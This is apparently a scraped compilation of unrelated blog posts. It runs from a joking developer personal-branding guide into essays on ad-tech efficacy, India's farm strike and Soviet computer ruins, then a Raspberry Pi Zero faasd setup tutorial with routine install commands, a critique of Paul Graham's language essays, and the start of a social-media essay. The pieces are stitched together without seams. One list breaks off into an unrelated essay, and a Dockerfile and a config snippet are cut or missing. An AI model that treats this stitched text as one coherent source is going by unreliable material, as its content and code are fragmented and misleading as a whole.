<p>Start putting all your coding projects on GitHub. Version control and open source is cool.</p>
<h3 id="pinned"><a href="#pinned" aria-label="pinned permalink"></a>Pinned</h3>
<p>Pin your most starred/forked/favorite repos so that lurkers can see them immediately.</p>
<h3 id="commits"><a href="#commits" aria-label="commits permalink"></a>Commits</h3>
<p>Coding for a school assignment? Great, make that repo private and still commit frequently to it. Definitely turn on private contributions for your activity calendar:</p>

<p>You can keyboard smash as commits for private repos but you should probably have legit commit messages for your public ones.</p>
<blockquote>
<p>Commit to GitHub more than relationships.</p>
</blockquote>
<p>Repeat this mantra over and over again. It’s a central tenet of being a VSCode girl.</p>
<h3 id="profile-readme"><a href="#profile-readme" aria-label="profile readme permalink"></a>Profile README</h3>
<p>Recently, GitHub let users add a <a href="https://docs.github.com/en/free-pro-team@latest/github/setting-up-and-managing-your-github-profile/managing-your-profile-readme" target="_blank">profile README</a> that sits on top of the profile page.</p>
<p>People have gotten <a href="https://towardsdatascience.com/build-a-stunning-readme-for-your-github-profile-9b80434fe5d7" target="_blank">real creative</a> with how to utilize this space. I opted for a <a href="https://github.com/karenying" target="_blank">simpler approach</a> but you can really do whatever you want.</p>

<p>If you’re a student, you get GitHub Pro for <a href="https://education.github.com/pack" target="_blank">free</a>.</p>
<p>Do I know what benefits I get for it? No. But does it look cool? Yes.</p>
<h2 id="personalportfolio-site"><a href="#personalportfolio-site" aria-label="personalportfolio site permalink"></a>Personal/Portfolio Site</h2>
<p>Create a personal and/or portfolio site to show off your personality and your projects.</p>
<p>I bought my domain off <a href="https://www.godaddy.com/" target="_blank">GoDaddy</a>, built it with <a href="https://reactjs.org/docs/create-a-new-react-app.html" target="_blank">React</a>, and deployed it for free on <a href="https://www.netlify.com/" target="_blank">Netlify</a>.</p>
<p>Some blog posts I wrote to help with this:</p>
<ul>
<li><a href="https://www.blog.karenying.com/posts/adding-transitions-to-a-react-carousel-with-material-ui" target="_blank">Adding Transitions to a React Carousel with Material-UI</a></li>

</ul>
<p>Link your site EVERYWHERE. GitHub, LinkedIn, Twitter, Facebook, Instagram, and yes even your Hinge.</p>
<h2 id="hinge"><a href="#hinge" aria-label="hinge permalink"></a>Hinge</h2>
<p>If you thought <a href="https://hinge.co/" target="_blank">Hinge</a> was a dating app … No, it is so much more. For starters, it is THE place to expand your personal brand’s reach. You just gotta tailor your profile towards the average tech bro, slap your personal site link on it, and watch your SEO skyrocket (disclaimer: SEO is a blackbox — no one really knows how it works but I promise you this can’t hurt).</p>
<p>You think I’m kidding? This is the first prompt on my profile:</p>

<p>To trap the tech bros(’ views), you need to mention some other buzzwords on your profile (think: climbing, boba, Elon, Robinhood) and set your location to South Bay.</p>
<p>A side effect, whether you like it or not, is that you’ll receive DMs like such:</p>
<blockquote>
<p>What’s your favorite stack? Mine is me on top of you</p>
</blockquote>
<p>Ugh gross 🤮 but probably <a href="https://www.mongodb.com/mern-stack" target="_blank">MERN</a></p>
<blockquote>
<p>Are you http? Because me without you is just ://</p>
</blockquote>
<p>Pretty clever but are you insecure? Why not HTTPS smh</p>
<blockquote>
<p>Is this entire profile just an ad</p>
</blockquote>
<p>Yes.</p>
<blockquote>
<p>Can you build me a website</p>
</blockquote>
<!-- prettier-ignore -->
<p>Sure. I charge $100 for an initial consultation and $200/hour after that. <a href="mailto:karenying7@gmail.com" target="_blank">Email me</a></p>
<!-- prettier-ignore -->
<blockquote>
<p>if ([REDACTED] === cute) return go_on_date</p>
</blockquote>
<p>Triple equals implies JavaScript which uses camelCase, not 🐍 Boy, bye</p>
<p>But remember, Hinge is not a dating app, it’s merely a stepping stone (where you step on tech bros) for SEO. Do not get distracted.</p>
<h2 id="blog"><a href="#blog" aria-label="blog permalink"></a>Blog</h2>
<p>You can start by writing on <a href="https://medium.com/" target="_blank">Medium</a>. It’s free with low barriers to entry.</p>
<p>If you want to take it to the next level, you can code your own blogging site. This site was bootstrapped with <a href="https://github.com/alxshelepenok/gatsby-starter-lumen" target="_blank">Lumen</a>, a lightweight <a href="https://www.gatsbyjs.com/" target="_blank">Gatsby</a> blog starter. It is statically hosted on <a href="http://netlify.com/" target="_blank">Netlify</a>.</p>
<h2 id="linkedin"><a href="#linkedin" aria-label="linkedin permalink"></a>LinkedIn</h2>
<p>To have a successful LinkedIn, you need a couple of things:</p>
<ul>
<li>A clean semi-professional headshot</li>
<li>A tasteful banner/cover image</li>
<li>A succinct header</li>
<li>Filled out details for every section</li>

<p>In my book "How to Destroy Surveillance Capitalism" I point out that the claims for Big Tech powers of behavior modification powers emanate from the companies' own self-serving boasts pitched to bring in new ad-tech customers.</p>
<p><a href="https://onezero.medium.com/how-to-destroy-surveillance-capitalism-8135e6744d59">https://onezero.medium.com/how-to-destroy-surveillance-capitalism-8135e6744d59</a></p>
<p>I point to the thinness of the external research on ad-tech's efficacy, and the replication failures of its research foundations on things like "sentiment analysis," "microexpressions" and "Big 5 Personalities" – the whole panoply of digital phrenology.</p>
<p>Meanwhile, there are undeniable, easily measured means by which Big Tech modifies our behavior that don't require us to treat marketing puffery as ground truth.</p>
<ul>
<li>If you want to talk to your friends you have to use Facebook because Mark Zuckerberg is holding them hostage with monopoly tactics
</li>
<li>
<p>Google uses monopoly rents to buy its way to search default on every platform, so the answer to every question you ask comes from Google</p>
</li>
<li>
<p>Apple gets to decide which apps you're allowed to use, who can fix your devices, and when you have to throw them away and buy new ones, thanks to DRM and lavish spending to kill dozens of Right to Repair initiatives</p>
</li>
</ul>
<p>These are mass-scale, persistent behavior modifications that have nothing to do with psychological manipulation and everything to do with economic chicanery.</p>
<p>This week on the Freakonomics podcast, Stephen Dubner turns an economic lens on Big Tech's ad-tech boasts.</p>
<p>He talks to Steve Tadelis, an academic economist who once headed a program at Ebay to evaluate the efficacy of ad spending. First they tried eliminating "brand" advertising (that is, advertising buys for the word "ebay") and found that there was no drop in their revenues.</p>
<p>The logic behind Ebay buying ads for "ebay" is that if they don't, their competitors will, so a search for "ebay" will bring up links to Amazon. That happened…and people scrolled right past the Amazon ads to the "organic" Ebay link below the ads.</p>
<p>But Ebay also buys a bunch of keyword ads for products, like "guitar" or "washing machine" or "picture frame." They estimated 5% of their revenue came from these ads, and that every $1 they spent on them brought in $1.50.</p>
<p>Tadelis designed another experiment and found that these ads were actually responsible for 0.5% of their revenue – an order of magnitude less than their estimate – and that every $1 they spent generated $0.60 in <em>losses</em>. They cut $100m from their ad-spending.</p>
<p>But despite publication of these findings, the world increased its ad-tech spending. Tadelis attributes this to the fact that the major players in ad-tech are all incentivized to repeat the unsubstantiated tale of ad-tech's efficacy.</p>
<p>Ad-tech companies, publishers, and ad-tech buying consultancies are all compromised and unable to objectively assess whether ads work (cue Upton Sinclair: "It's difficult to get a man to understand something when his salary depends on his not understanding it").</p>
<p>And, of course, now Big Tech's critics have joined the ranks of those who insist that ad-tech works with spooky, devastating efficacy.</p>
<p>For evidence, all of them point to how much money the industry generates.</p>
<p>Why would people buy these products if they didn't work? Well, the obvious answer is, "That happens all the time." See:</p>
<ul>
<li>Multivitamins
</li>
<li>
<p>Hedge funds</p>
</li>
</ul>
<p>But there's another answer: "it's a bubble."</p>
<p>A recent, excellent book on the ad-tech bubble is Tim Hwang's SUBPRIME ATTENTION CRISIS:</p>
<p><a href="https://pluralistic.net/2020/10/05/florida-man/#wannamakers-ghost">https://pluralistic.net/2020/10/05/florida-man/#wannamakers-ghost</a></p>
<p>Hwang tells Dubner that in a bubble, "the red lights are flashing but everybody in the industry just refuses to take a look at the real data."</p>
<p>Bubbles thrive on opacity and complexity. Think of the 2008 financial crisis, where the lack of transparency in "toxic assets" was compounded by their complexity, which led people – including "sophisticated" regulators and investors – to trust them.</p>
<p>They assumed that the manifest absurdity of the claims made by CDO salespeople must reflect their own ignorance. After all, all those OTHER people wouldn't spend trillions on derivatives if they weren't safe enough to buy yourself and exercise regulatory forbearance over.</p>
<p>But as Hwang points out, the ad-tech market is built on garbage. By Google's own reckoning, 60% of the ads that are charged for are never seen by any human being – literally the majority of the industry's product is a figment of feverish machine imaginations.</p>
<p>While Google's own research (and that of other Big Tech players) show that ad-tech works, independent researchers find the opposite: switching from "behavioral" (surveillance) ads to "contextual" ads only reduces clickthrough by 5%.</p>
<p>Behavioral ad clickthroughs are 0.01-0.03%, and much of that is bot activity.</p>
<p>The industry is opaque and incestuous. Ad agencies – nominally working for advertisers – get massive kickbacks from ad-tech platforms for bringing them business.</p>
<p>Proctor and Gamble – the company that invented the concept of brand ads – tried taking $200m out of its online ad spend and saw <em>zero</em> change in sales.</p>
<p>And yet, ad-tech spending continues to rise.</p>
<p>Hwang says we need a "punk rock" National Bureau of Economic Research, an org that will neutrally measure ad-tech performance and slowly deflate the bubble rather than bursting it, because an ad-tech collapse would kill ad-supported media.</p>
<p>All this is kind of a microcosm for the problems of economics in general. For decades, economics was dominated by the neoclassical idea of "homo economicus," a rational utility maximizer whose bad choices were good, actually.</p>
<p>(That's still the cartoon that undergrads get)</p>
<p>Advertising – especially brand ads – is grounded in the idea that irrationality is universal and exploitable, that you can trick people into paying a 50,000% markup by slapping a logo on a t-shirt.</p>
<p>But advertisers – and the industry – assume <em>they</em> are immune to irrationality, that they don't need to worry that they themselves will be suckered by slick sales-patter from ad tech, or their agencies.</p>

<p>Last week, the largest organized strike in human history shut down India. 250,000,000 people struck against Indian PM Narendra Modi's neoliberal reforms to the agricultural sector.</p>
<p><a href="https://www.democracynow.org/2020/12/3/india_protests_modi_neoliberal_reforms">https://www.democracynow.org/2020/12/3/india_protests_modi_neoliberal_reforms</a></p>
<p>These reforms don't just remove the collective bargaining and price controls that protect the ag sector (which employs more than half the Indian working population), but also stripped multinational corporations and government of liability for harms to their workers.</p>
<p>All this while unemployment is at 27%, and 76% of rural Indians lack the funds to cover their basic nutritional needs. Meanwhile Indian billionaires have increased their wealth by 35% during the pandemic. India's richest man, Mukesh Ambani, has made $12m per <em>hour</em> since March.</p>
<p>The strike didn't just turn out unemployed people and farmers: the turnout was driven by acts of solidarity from ever sector of society.</p>
<p>In his discussion with Amy Goodman on Democracy Now, P Sainath offers some really important political context.</p>
<p>Modi has had a comfortable Congressional majority for two years and has three years left to go in his mandate, so why did he wait for the pandemic to make this far-reaching power-grab?</p>
<p>Sainath: "The reasoning was, these blokes are on their knees now. They can’t organize. They can’t hit back. And in fact, many leading neoliberal intellectuals, economists and journalists, editors, incited the government, saying, 'Never waste a good crisis.'"</p>
<p>It's shock doctrine shit, in other words. But Modi badly misjudged the moment: rather than being beating beyond resistance, Indians have been beaten to the sticking point, and will no longer be fooled by religious bigotry and neoliberal fairy tales.</p>
<p>Right wing movements around the world are grounded in the idea that some people are born to rule and the rest of us are born to be ruled over. Antimajoritarian philosophy isn't compatible with democracy, because it requires sustained turkeys-voting-for-Christmas to survive.</p>
<p>As India shows, the traditional tools of antimajoritarianism – xenophobia, sectarianism, armed violence – are unstable in the long run. Eventually there comes a point when you can't just shout "Muslims are scary!" at starving people and expect them to take that for an answer.</p>
<p>Indians have been slaughtered by both covid and mismanagement. They are at the breaking point. They are rising up.</p>

<p>In the 1970s, the Soviet Union started to clone DEC's PDP workhorse minicomputers, especially the PDP-8, which was replicated in the USSR as the Saratov-2. Today, the Saratov-2 is a distant memory, with not even a single high-quality photo of the system online.</p>
<p>Until now. Russian urban explorer Ralph Mirebs's photos of a "Soviet Computing Cemetery" (location undisclosed) that features the rotting remains of a Saratov-2 amid the ashes and fire-suppresant residue of a long-ago data-center blaze.</p>
<p><a href="https://rusue.com/cemetery-of-soviet-computers/">https://rusue.com/cemetery-of-soviet-computers/</a></p>
<p>The Saratov-2 was wild: it didn't have a microprocessor; rather, it was broken down into components, each in its own drawer: a 12-bit computing unit, I/O, RAM (ferromagnetic cubes).</p>
<p>Also present in the cemetery: an Electronics 100/25 – the Soviet version of the PDP-11 – and some DVK-2Ms (early personal computers).</p>
<p>The author recalls their own computer science education in 1993, when "one teaching DVK could distribute programs for a couple of dozen Spectrums through the network."</p>
<p>One of my last trips before the crisis hit was my visit to the Computer History Museum's boneyard – a massive warehouse filled …</p></div></article></div>

        <section>
            <div><p>The <a href="https://www.raspberrypi.org/products/raspberry-pi-zero/?resellerType=home">Raspberry Pi Zero</a> and original Raspberry Pi both have a 32-bit ARM architecture which many projects have dropped support for. So when I saw that <a href="https://github.com/containerd/containerd/pull/4530">containerd recently merged a fix</a> for building containerd on armv6, started to think what I could do with it.</p>
<p>Earlier that month, a user of the <a href="http://github.com/openfaas/faasd">faasd project</a> which runs very well on VPSes, RPi 3 and RPi4 asked me whether it could work on the Zero and I told him it was not practical or worth his time. After all, an RPi4 with 2GB of RAM, 4 Cores and much faster I/O is only 25GBP/EUR/USD.</p>
<blockquote>
<p><a href="https://github.com/openfaas/faasd">faasd is OpenFaaS</a>, but for a single node, and designed for those who don't want to pay for and manage an entire Kubernetes cluster, GitOps, service-mesh, and IngressController just to deploy a few simple functions.</p>
</blockquote>
<p>My past experiences told me that it would be a challenge to get the zero working. It has such a paltry amount of memory available and its I/O is really slow. Still, sometimes it's fun to do things that we shouldn't. Had I been <a href="https://xkcd.com/356/">"nerd sniped"</a>?</p>
<p><img src="https://www.raspberrypi.org/homepage-9df4b/static/1dfa03d09c1f3e446e8d936dfb92267f/8924f/6b0defdbbf40792b64159ab8169d97162c380b2c_raspberry-pi-zero-1-1755x1080.jpg" width="60%">
&gt; The RPi Zero originally released in 2015.
</p><p>In this post I'll show you what you need to do to deploy functions through the <a href="https://github.com/openfaas/faas-cli">OpenFaaS CLI</a> and be able to invoke them, including multi-arch builds. At the end of the post I'll explain what the limitations are and whether we should leave the Raspberry Pi Zero with those fond memories we have of it when it was <a href="https://en.wikipedia.org/wiki/Raspberry_Pi">released in 2015</a>, 5 years ago.</p>
<h2 id="walkthrough">Walk-through</h2>
<h3 id="prereqs">Pre-reqs</h3>
<p>You will need:</p>
<ul>
<li>Raspberry Pi Zero</li>
<li>Ethernet adapter and USB &lt;&gt; USB A micro shim</li>
<li>16-32GB class 10 SD card</li>
<li>MicroUSB power adapter</li>
</ul>
<p>Flash the latest version of Raspberry Pi OS Lite to your SD card, and then create an <code>ssh</code> file in the <code>/boot/</code> folder.</p>
<p>Power up the Raspberry Pi and ssh to it with <code>ssh pi@raspberrypi.local</code>.</p>
<h3 id="installgo">Install go</h3>
<p>You can install Go from a package manager, but the version is likely to be rather old. Fortunately the Go team still ship a binary for armv6:</p>
<pre><code>export ARCH="armv6l"
echo "Downloading Go"

curl -SLsf https://dl.google.com/go/go1.13.15.linux-$ARCH.tar.gz --output /tmp/go.tgz
sudo rm -rf /usr/local/go/
sudo mkdir -p /usr/local/go/
sudo tar -xvf /tmp/go.tgz -C /usr/local/go/ --strip-components=1

export GOPATH=$HOME/go/
export PATH=$PATH:/usr/local/go/bin/
</code></pre>
<p>You now have Go installed, run <code>go version</code> to see it working.</p>
<h3 id="buildcontainerd">Build containerd</h3>
<p>faasd uses containerd rather than Docker, but there are no official binaries for any of the ARM CPUs, so we have to build them from source.</p>
<p>For armv7 and ARM64, you can use my repo <a href="https://github.com/alexellis/containerd-arm">alexellis/containerd-arm</a>. It's my hope to see ARM support upstreamed, but having spoken on several occasions to the containerd team, it seems very unlikely that we will see this happen.</p>
<p>On my first attempt of building I got the following error:</p>
<pre><code>+ bin/containerd
# github.com/containerd/containerd/cmd/containerd
/usr/local/go/pkg/tool/linux_arm/link: running gcc failed: fork/exec /usr/bin/gcc: cannot allocate memory
make: *** [Makefile:188: bin/containerd] Error 2
</code></pre>
<p>The RPi Zero and the largest RPi 1 only has 512MB of RAM and I slowly watched the RAM being eaten up with <code>watch -n "free -h"</code>.. I should have remembered this.</p>
<p>Fortunately I had the battle scars and knew what I had to do:</p>
<pre><code>sudo dd if=/dev/zero of=/swapfile bs=1024 count=1M &amp;&amp;\
  sudo mkswap /swapfile &amp;&amp; \
  sudo swapon /swapfile
</code></pre>
<p>This creates 1GB of swap, on the SD card.. which already has terrible I/O, but it may just work.</p>
<p>The other trick you may have seen me talk about is adding <code>gpu_mem=16</code> to <code>/boot/config.txt</code>. It seems pointless changing the split on an 8GB RPi4, but for our RPi Zero, we need every MB we can get.</p>
<p>Second time lucky?</p>
<p>No. It failed again due to some missing libraries. I reminded myself to read <a href="https://github.com/containerd/containerd/blob/master/BUILDING.md#build-containerd">BUILDING.md</a> from the containerd repo. After adding libseccomp and a few other packages, it started to move along again.</p>
<pre><code>make
+ bin/ctr
+ bin/containerd
+ bin/containerd-stress
+ bin/containerd-shim
+ bin/containerd-shim-runc-v1
+ bin/containerd-shim-runc-v2
+ binaries
</code></pre>
<p>I don't know if it was 10 minutes or over an hour, but it was slow progress.</p>
<p>I then ran <code>sudo make install</code> and copied the systemd unit file into place with:</p>
<pre><code>sudo cp containerd.service /etc/systemd/system/containerd.service
sudo systemctl enable containerd
</code></pre>
<p>I didn't want to start containerd at this time, to save on memory for the next task.</p>
<h3 id="buildfaasd">Build faasd</h3>
<p>The faasd Makefile needed a patch because it was set to cross-compile to armv7, but we needed armv6.</p>
<pre><code>.PHONY: dist
dist:
	CGO_ENABLED=0 GOOS=linux GOARCH=arm GOARM=6 go build -mod=vendor -ldflags $(LDFLAGS) -a -installsuffix cgo -o bin/faasd-armhf
</code></pre>
<p>This took so long to build on the zero that I gave up and built it on my Intel NUC. Fortunately Go is very good as cross-compiling, especially when linking into C/C++ libraries is disabled with <code>CGO_ENABLED=0</code>.</p>
<p>I then ran <code>scp</code> to copy the binary to the Raspberry Pi.</p>
<pre><code>sudo cp faasd-armhf /usr/local/bin/faasd
cd go/src/github.com/openfaas/faasd
</code></pre>
<p>The final step was to install faasd which creates two systemd unit files:</p>
<ul>
<li>faasd - for the OpenFaaS core services</li>
<li>faasd-provider - for the provider that supports CRUD and Invoke operations</li>
</ul>
<pre><code>sudo faasd install
</code></pre>
<p><img src="https://blog.alexellis.io/content/images/2020/12/faasd-install.jpg" alt="faasd-install"></p>
<h3 id="unexpectedissues">Unexpected issues</h3>
<p>I tried to log in with <code>faas-cli login</code>, but it didn't work. I saw a number of errors in the logs <code>sudo systemctl journalctl -u faasd</code>:</p>
<pre><code>Dec 03 23:18:49 zero-dns default:basic-auth-plugin[13218]: standard_init_linux.go:207: exec user process caused "exec format error"
Dec 03 23:18:50 zero-dns containerd[12169]: time="2020-12-03T23:18:50.338589900Z" level=info msg="starting signal loop" namespace=default path=/run/containerd/io.containerd.runtime.v2.task/default/gateway pid=13324
Dec 03 23:18:52 zero-dns default:gateway[13335]: standard_init_linux.go:207: exec user process caused "exec format error"
</code></pre>
<p>It turned out that out of nats, prometheus, and the openfaas gateway, the openfaas basic-auth plugin only nats was available for armv6. It seems that projects really have moved on and left armv6 behind.</p>
<h3 id="thenihadanidea">Then I had an idea</h3>
<p>What if we didn't run the whole OpenFaaS stack at all, but just the <code>faasd-provider</code>? It would allow this tiny device to support all the CRUD operations on functions, and invocations, but nothing more.</p>
<p>The provider seemed to be running well, and responding to <code>faas-cli</code> commands:</p>
<p><img src="https://blog.alexellis.io/content/images/2020/12/provider.png" alt="provider"></p>
<p>We'd lose the queue and async invocations, lose the UI, lose the metrics, but we could still deploy functions and invoke them.</p>
<p>It was already very late by this point so I decided to sleep on it.</p>
<h3 id="inthemorning">In the morning</h3>
<p>I powered up the RPi zero and tried deploying a container directly to the faasd endpoint, and it worked.</p>
<p><img src="https://blog.alexellis.io/content/images/2020/12/deploy.jpg" alt="deploy"></p>
<p>Now, I had to make a few changes. Rather than building with the OpenFaaS watchdog in the container, I just used a Dockerfile and a plain Go HTTP server.</p>
<p>Here's what I ended up with:</p>
<p>Dockerfile</p>

faas-cli deploy
</code></pre>
<p>Using the PC means we can cross-compile the Go HTTP server and push a multi-arch image to the container registry. The new <code>faas-cli publish</code> command comes in handy for this and can accept a list of architectures.</p>
<p>The <code>deploy</code> command talks to the remote machine over REST and tells it to deploy a function. The server-side handler <a href="https://github.com/openfaas/faasd/blob/master/pkg/provider/handlers/deploy.go">deploy.go</a> pulls the image into containerd and starts executing it as a container.</p>
<h3 id="onemorething">One more thing</h3>
<p>When I say that it worked. I should clarify that I'd forgotten to deploy CNI - the networking layer required for faasd and containerd.</p>
<p>I saw this error by running the following:</p>
<pre><code>sudo journalctl -u faasd
</code></pre>
<p>Not that long ago, <a href="https://github.com/openfaas/faasd/blob/master/docs/DEV.md">I'd documented all the steps required for a manual installation</a>, but somehow forgot this was needed.</p>
<pre><code>export ARCH=arm
export CNI_VERSION=v0.8.5

sudo mkdir -p /opt/cni/bin
curl -sSL https://github.com/containernetworking/plugins/releases/download/${CNI_VERSION}/cni-plugins-linux-${ARCH}-${CNI_VERSION}.tgz | sudo tar -xz -C /opt/cni/bin

{
    "cniVersion": "0.3.1",

</code></pre>
<p>Just changing "ARCH" to "arm" was enough to make it work. So the CNI project are still <a href="https://github.com/containernetworking/plugins/blob/master/.travis.yml">building the plugins against armv6</a> for the time being.</p>

		<article>
			<p>From the moment I started paying attention to the tech industry, Paul Graham was there.  My first job out of college was in SoMa, around the corner from the Justin.tv offices, and his essays were just floating around in the ether, impossible to ignore.  His popularization of Lisp was a small part of why I tried Clojure, and a big part of why Clojure was successful.</p>

<p>I recognized that he had a tendency towards <a href="http://www.paulgraham.com/avg.html">self-aggrandizement</a> and <a href="http://www.paulgraham.com/nerds.html">awkward flattery of his readers</a>, but at worst he seemed harmless.  As his writing became increasingly focused on startups, and I became increasingly sure I didn’t want to be a founder, he simply drifted out of view.</p>

<p>Recently, however, his writing has taken a reactionary turn which is hard to ignore.  He’s <a href="http://www.paulgraham.com/mod.html">written</a> about the need to defend “moderates” from bullies on the “extreme left”, <a href="https://twitter.com/paulg/status/1334441961147822081">asserted</a> that “the truth is to the right of the median” because “the left is culturally dominant,” and <a href="https://pbs.twimg.com/media/EjGX2-bU4AAWkUX?format=jpg&amp;name=medium">justified</a> Coinbase’s policy to ban discussion of anything deemed “political” by saying that it “will push away some talent, yes, but not very talented talent.”</p>

<p>I went back to the essays I had read a decade before, to see if I had missed something.  It turned out that I had.  There was a consistent intellectual framework underpinning all his writing, from his very first essays on Lisp and language design.  In many ways, those early essays contained the clearest articulation of his framework; it just took me ten years to see it.</p>

<hr>

<p>In April 2001, six years after the release of the Java language, Paul Graham weighed in:</p>

<blockquote>
  <p><a href="http://paulgraham.com/javacover.html">I’ve never written a Java program, never more than glanced over reference books about it, but I have a hunch that it won’t be a very successful language.</a></p>
</blockquote>

<p>He followed up with a number of observations about Java, such as the fact that it was designed by committee, infantilizes its users, and owed its initial success to an ailing corporate sponsor.  But, he wrote, this wasn’t an analysis of Java so much as introspection on his own “hacker’s radar”.  This radar was the aesthetic response of an expert programmer, drawn from epiphenomena surrounding the language and the opinions of other experts in his social circle.</p>

<p>A month later, in an essay on why languages are popular, he doubled down on the importance of his personal intuition:</p>

<blockquote>
  <p><a href="http://www.paulgraham.com/popular.html">Programming languages are <em>for</em> hackers, and a programming language is good as a programming language (rather than, say, an exercise in denotational semantics or compiler design) if and only if hackers like it.</a></p>
</blockquote>

<p>The quality of a language can only be judged by experts (“a tiny minority, admittedly, but that tiny minority write all the good software”), and adoption by those experts will drive adoption by everyone else.  Ultimately, “a programming language probably becomes about as popular as it deserves to be.”</p>

<p>The context for both essays was that Graham was creating his own language, <a href="http://www.paulgraham.com/arc.html">Arc</a>.  He wanted it to be popular, and was working out how to make that happen.</p>

<p>The first intrinsic driver of popularity he named was “brevity”:</p>

<blockquote>
  <p><a href="http://www.paulgraham.com/popular.html">It would not be far from the truth to say that a hacker about to write a program decides what language to use, at least subconsciously, based on the total number of characters he’ll have to type.</a></p>
</blockquote>

<p>He called back to this when discussing the importance of libraries, which can reduce any program to a single invocation:</p>

<blockquote>
  <p><a href="http://www.paulgraham.com/popular.html">Of course the ultimate in brevity is to have the program already written for you, and merely to call it. And this brings us to what I think will be an increasingly important feature of programming languages: library functions. Perl wins because it has large libraries for manipulating strings.</a></p>
</blockquote>

<p>It appears that Graham was referring to Perl’s core library functions, not the much larger set of library functions that were even then available via <a href="https://www.cpan.org/">CPAN</a>, because he placed this responsibility wholly upon the shoulders of the language designer, saying language design would become increasingly focused on “how to design great libraries.”</p>

<p>Graham named other drivers of popularity in this essay, but he returned to brevity <a href="http://www.paulgraham.com/langdes.html">again</a> and <a href="http://www.paulgraham.com/power.html">again</a> over the next year, culminating in an essay on the singular importance of brevity, now dubbed “succinctness”:</p>

<blockquote>
  <p><a href="http://www.paulgraham.com/power.html">My hypothesis is that succinctness is power, or is close enough that except in pathological examples you can treat them as identical.</a></p>
</blockquote>

<p>Drawing from studies that found “programmers seemed to generate about the same amount of code per day regardless of the language”, he declared that “the only way to get software written faster was to use a more succinct language”.</p>

<p>Nowhere, however, did he mention libraries.  The next month, he explained that given a sufficiently succinct language, users could simply write their own libraries:</p>

<blockquote>
  <p><a href="http://www.paulgraham.com/icad.html">As for libraries, their importance also depends on the application. For less demanding problems, the availability of libraries can outweigh the intrinsic power of the language. Where is the breakeven point? Hard to say exactly, but wherever it is, it is short of anything you’d be likely to call an application. If a company considers itself to be in the software business, and they’re writing an application that will be one of their products, then it will probably involve several hackers and take at least six months to write. In a project of that size, powerful languages probably start to outweigh the convenience of pre-existing libraries.</a></p>
</blockquote>

<p>This was a significant departure from his earlier writings.  Only a year before, he had stated that “[i]t’s hard to design good libraries. It’s not simply a matter of writing a lot of code.”  He had emphasized that library design was a key part of language design, and even a year later he would tell us “[d]esign usually has to be under the control of a single person to be any good.”</p>

<p>Now he argued that the language designer only need provide a barebones language of sufficient brevity, and all else would follow.  Library design can’t be both critically important and an incidental part of someone else’s six-month software project.  Despite this, Graham never mentioned libraries ever again.</p>

<p>A year later, he explained that Arc was trying to be a “hundred-year language”.  “It may seem presumptuous,” he wrote, but “[l]anguages evolve slowly because they’re not really technologies. Languages are notation. A program is a formal description of the problem you want a computer to solve for you.”  He asserted the most important part of the language were the “fundamental operators”, because the rest of the language “could in principle be written in terms of these fundamental operators”.</p>

<p>What, then, makes a language ready for the 22nd century?  Certainly not any concerns about performance, since “[e]ven if [computers] only end up being a paltry million times faster, that should change the ground rules for programming languages substantially.”  Not data structures, since they’re just a premature optimization of the humble list.  Not a mechanism (or even notation) for parallel computation, since a simple description of the problem will “ignore any advantages to be got from parallel computation, just as they will ignore advantages to be got from specific representations of data.”</p>

<p>A hundred-year language <em>should</em>, however, be succinct.  First “write down the program you’d like to be able to write, regardless of whether there is a compiler that can translate it or hardware that can run it.”  And of course the program you’d really like to write is the shortest one possible:</p>

<blockquote>
  <p><a href="http://www.paulgraham.com/hundred.html">[T]he algorithm for language design becomes: look at a program and ask, is there any way to write this that’s shorter?</a></p>
</blockquote>

<p>“If we had the hundred-year language now,” Graham wrote, “it would at least make a great pseudocode.”  Confusingly, he asserted that since it will need to perform well on its million-times-faster future processor, “presumably it could generate code efficient enough to run acceptably well on our hardware.”</p>

<p>“When you see these ideas laid out like that,” he wrote, “it’s hard not to think, why not try writing the hundred-year language now?”</p>

<hr>

<p>Four years later, in 2008, Arc was released.  It was a <a href="https://en.wikipedia.org/wiki/Common_Lisp#The_function_namespace">Lisp-1</a> with shorter names and fewer parentheses than most other Lisps, and some reader macros to make anonymous functions easier to define.  All primitives were defined in terms of MzScheme, a different Lisp, which provided the compiler and other tooling.  It also came with a barebones web framework which used continuations, reminiscent of the Smalltalk-based <a href="https://en.wikipedia.org/wiki/Seaside_(software)">Seaside framework</a> which had been around since 2002.</p>

<p>It was, in all, underwhelming.  There were many paths that could have led Graham to his professed goals, and he took none of them.</p>

<p>He had written that strings were premature optimization, and should be replaced by lists of characters.  If he had done so, and made the characters full <a href="https://en.wikipedia.org/wiki/Code_point">Unicode code points</a>, Arc could have been one of the few languages not suffering from a half-century hangover stretching all the way back to <a href="https://en.wikipedia.org/wiki/EBCDIC">EBCDIC</a>.  Instead, the initial release used byte strings which only supported the ASCII character set.</p>

<p>Graham had asked “[h]ow many times have you heard hackers speak fondly of how in, say, APL, they could do amazing things with just a couple lines of code? I think anything that really smart people really love is worth paying attention to.”  But the undeniably succinct primitives and composition rules of array programming languages were nowhere to be found.</p>

<p>Server-based deployment of software was a <a href="http://www.paulgraham.com/road.html">central theme</a> in Graham’s essays, and his continuation-based web framework was an interesting and fairly novel way to create continuity across multiple requests in a single session.  But since each link on the page was a continuation, and each continuation was stored in-memory in a single process, this created a single, memory-hungry point of failure.  For years, <a href="https://news.ycombinator.com/news">Hacker News</a> would simply display “unknown or expired link” if you waited too long to click a link.  If Arc had its own runtime, it could have supported …</p></article></div></div></div>

December 6, 2020 | https://dubeyaayush07.github.io/deliberate-mistakes/rethinking-social-media/ | <a href="https://web.archive.org/web/*/https://dubeyaayush07.github.io/deliberate-mistakes/rethinking-social-media/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemscope="" itemtype="http://schema.org/Article"><header><p>December 05, 2020</p></header><section itemprop="articleBody"><h2>Introduction</h2>
<p>The harmful effects of the algorithms employed by social networking platforms like Twitter and Facebook has been well documented: polarisation, privacy issues, you name it. Even though I share a lot of these concerns between all the petty tribalism there is potential for having deep and meaningful conversations too. But I do not think it is possible to improve existing social networks, as even though these networks are not inherently evil they are a result of a bad business model. Their main objective is maximising user engagement the more time you spend glued to your screen the better. With this model at the core it is hard for these companies to implement change. In certain cases taking initiatives for improving the mental well being of users or for promoting productive discourse might be impractical too. The quality of the experience is secondary to the screen time.</p>
<p>The solution in my opinion is to build networks with strong core values that promote productive conversations. Start with a small community with a solid foundation then gradually expand keeping the values intact. What would such a network look like? Well like anything great it will have to take what is good about its predecessors and improve on their shortcomings. The improvements should be significant so as to provide a reason for people to actually switch. But improvements is a vague term to see how social networks can be improved I think it is better to analyse and think about the components that make up these networks from first principles.</p>
